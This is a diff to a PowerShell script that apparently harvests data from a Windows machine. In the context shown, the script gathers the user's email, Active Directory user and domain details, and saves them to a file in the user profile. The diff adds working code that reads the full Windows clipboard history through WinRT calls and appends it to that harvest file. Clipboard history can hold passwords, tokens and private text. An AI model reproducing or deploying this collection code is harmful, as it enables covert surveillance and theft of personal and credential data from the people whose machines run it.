@@ -123,6 +123,24 @@ function Get-email {
 }
 $EM = (Get-email | Out-String) 
 
+#ClipBoard History
+function Get-ClipHistory {
+    Add-Type -AssemblyName System.Runtime.WindowsRuntime
+    $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
+    function Await($WinRtTask, $ResultType) { 
+        $asTask = $asTaskGeneric.MakeGenericMethod($ResultType) 
+        $netTask = $asTask.Invoke($null, @($WinRtTask)) 
+        $netTask.Wait(-1) | Out-Null 
+        $netTask.Result
+    }
+    $null = [Windows.ApplicationModel.DataTransfer.Clipboard, Windows.ApplicationModel.DataTransfer, ContentType=WindowsRuntime]
+    $op = [Windows.ApplicationModel.DataTransfer.Clipboard]::GetHistoryItemsAsync()
+    $result = Await ($op) ` ([Windows.ApplicationModel.DataTransfer.ClipboardHistoryItemsResult])
+    $textops = $result.Items.Content.GetTextAsync()
+    for ($i = 0; $i -lt $textops.Count; $i++){ Await($textops[$i]) ([String]) }
+}
+$ClipBoardHistory = Get-ClipHistory
+
 #Enterprise
 $User2Find = $env:USERNAME
 $Query = "SELECT * FROM ds_user where ds_sAMAccountName = '$user2find'"
@@ -344,6 +362,12 @@ echo $EEM >> $env:USERPROFILE\$FileName
 
 #Name
 echo $LA >> $env:USERPROFILE\$FileName
+
+#ClipHistory
+echo "" >> $env:USERPROFILE\$FileName
+echo "ClipBoard History" >> $env:USERPROFILE\$FileName
+echo "####################" >> $env:USERPROFILE\$FileName
+echo $ClipBoardHistory >> $env:USERPROFILE\$FileName
 
 #DomainInfo
 ########################################################################################
